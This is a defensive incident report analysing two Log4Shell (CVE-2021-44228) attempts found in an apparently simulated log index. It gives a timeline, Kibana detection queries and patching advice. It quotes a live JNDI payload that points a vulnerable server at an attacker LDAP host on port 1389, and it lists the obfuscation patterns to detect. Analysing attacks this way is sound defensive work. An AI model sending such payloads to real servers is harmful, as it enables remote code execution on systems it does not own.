# Log4Shell (CVE-2021-44228) Exploit Analysis Report

## Executive Summary

This report analyzes network logs from the `logs-endpoint.events-simulated` index to identify Log4Shell exploit attempts. **Log4Shell** is a critical remote code execution vulnerability (CVE-2021-44228) in Apache Log4j 2 that allows attackers to execute arbitrary code by injecting JNDI lookup strings into log messages.

---

## Key Findings

### 1. Exploit Attempts Detected

| Metric | Value |
|--------|-------|
| **Total Exploit Events** | 2 |
| **Unique Attacker IPs** | 1 |
| **Primary Target Port** | 8080 |
| **Attack Vector** | HTTP User-Agent Header |

### 2. Attacker Source IP Address

The following source IP address was identified as attempting Log4Shell exploits:

| Source IP | Event Count | Target Port |
|-----------|-------------|-------------|
| **192.168.2.6** | 2 | 8080 |

### 3. Malicious Payload Analysis

The attacker embedded the following JNDI lookup string in the **User-Agent** header:

```
${jndi:ldap://192.168.2.6:1389/o=reference}
```

**Attack Breakdown:**
- **JNDI Protocol**: `ldap://` - Uses LDAP protocol for the lookup
- **Callback Server**: `192.168.2.6:1389` - Attacker-controlled LDAP server
- **Reference**: `o=reference` - Object reference to be loaded from the malicious LDAP server

### 4. Targeted Destination Ports

| Destination Port | Attempts | Description |
|------------------|----------|-------------|
| **8080** | 2 | HTTP Alternate (Web Application) |

The attacker consistently targeted **port 8080**, which is commonly used for web applications and Java application servers (e.g., Apache Tomcat).

### 5. Target Application Details

- **Target Endpoint**: `/Log4j-2.14.0-SNAPSHOT/api`
- **Target IP**: 192.168.2.5
- **HTTP Method**: GET
- **Log4j Version in Path**: 2.14.0-SNAPSHOT

> **Note**: Log4j version 2.14.0 is vulnerable to CVE-2021-44228. The attacker specifically targeted an endpoint that indicates a vulnerable Log4j version is in use.

---

## Attack Timeline

| Timestamp | Source IP | Destination | Event |
|-----------|-----------|-------------|-------|
| 2026-05-27T18:41:50.921Z | 192.168.2.6 | 192.168.2.5:8080 | Log4Shell exploit attempt |
| 2026-05-27T18:46:04.326Z | 192.168.2.6 | 192.168.2.5:8080 | Log4Shell exploit attempt |

---

## Kibana Queries for Validation

### Query 1: Detect All JNDI Payloads
```json
{
  "query": {
    "bool": {
      "should": [
        { "wildcard": { "message": "*jndi*" } },
        { "wildcard": { "url.path": "*jndi*" } },
        { "wildcard": { "user_agent.original": "*jndi*" } },
        { "wildcard": { "process.command_line": "*jndi*" } }
      ],
      "minimum_should_match": 1
    }
  }
}
```

**KQL Equivalent:**
```
message:*jndi* or url.path:*jndi* or user_agent.original:*jndi* or process.command_line:*jndi*
```

---

### Query 2: Identify Source IPs Sending JNDI Payloads
```json
{
  "size": 0,
  "query": {
    "wildcard": { "user_agent.original": "*jndi*" }
  },
  "aggs": {
    "attacker_ips": {
      "terms": { 
        "field": "source.ip",
        "size": 50,
        "order": { "_count": "desc" }
      }
    }
  }
}
```

---

### Query 3: Find Most Targeted Destination Ports
```json
{
  "size": 0,
  "query": {
    "wildcard": { "user_agent.original": "*jndi*" }
  },
  "aggs": {
    "targeted_ports": {
      "terms": { 
        "field": "destination.port",
        "size": 20,
        "order": { "_count": "desc" }
      }
    }
  }
}
```

---

### Query 4: Detailed Event Investigation
```json
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "user_agent.original": "*jndi*" } }
      ]
    }
  },
  "sort": [
    { "@timestamp": { "order": "desc" } }
  ],
  "_source": [
    "@timestamp",
    "source.ip",
    "source.port",
    "destination.ip",
    "destination.port",
    "user_agent.original",
    "url.path",
    "http.request.method",
    "message"
  ]
}
```

---

### Query 5: Broader Log4Shell Pattern Detection (Multiple Variants)
```json
{
  "query": {
    "bool": {
      "should": [
        { "wildcard": { "user_agent.original": "*${jndi*" } },
        { "wildcard": { "user_agent.original": "*${lower:*" } },
        { "wildcard": { "user_agent.original": "*${env:*" } },
        { "wildcard": { "user_agent.original": "*${sys:*" } },
        { "wildcard": { "message": "*${jndi*" } },
        { "wildcard": { "url.path": "*${jndi*" } },
        { "wildcard": { "url.path": "*${lower:*" } }
      ],
      "minimum_should_match": 1
    }
  }
}
```

**KQL Equivalent:**
```
user_agent.original:${jndi* or user_agent.original:${lower:* or user_agent.original:${env:* or message:${jndi* or url.path:${jndi*
```

---

## Recommendations

### Immediate Actions
1. **Block Source IP**: Consider blocking or closely monitoring traffic from `192.168.2.6`
2. **Patch Log4j**: Upgrade Log4j to version 2.17.1+ (or 2.12.4 for Java 7)
3. **WAF Rules**: Implement Web Application Firewall rules to block JNDI lookup patterns

### Detection Rules
Monitor for the following patterns in HTTP headers and request parameters:
- `${jndi:` (case-insensitive)
- `${lower:` (obfuscation technique)
- `${env:` (environment variable access)
- `${sys:` (system property access)

### Long-term Mitigation
- Keep Log4j updated to the latest secure version
- Implement principle of least privilege for application servers
- Enable logging and monitoring for LDAP/RMI outbound connections
- Consider using `log4j2.formatMsgNoLookups=true` system property for older versions

---

## Appendix: Log4Shell Background

**CVE-2021-44228** (Log4Shell) is a critical vulnerability in Apache Log4j 2 (versions 2.0-beta9 to 2.14.1) that allows:
- Remote Code Execution (RCE)
- Data exfiltration
- Lateral movement within networks

The vulnerability exists because Log4j performs JNDI lookups when processing log messages, allowing attackers to load and execute remote code via LDAP, RMI, or DNS protocols.

---

*Report generated from analysis of `logs-endpoint.events-simulated` index*
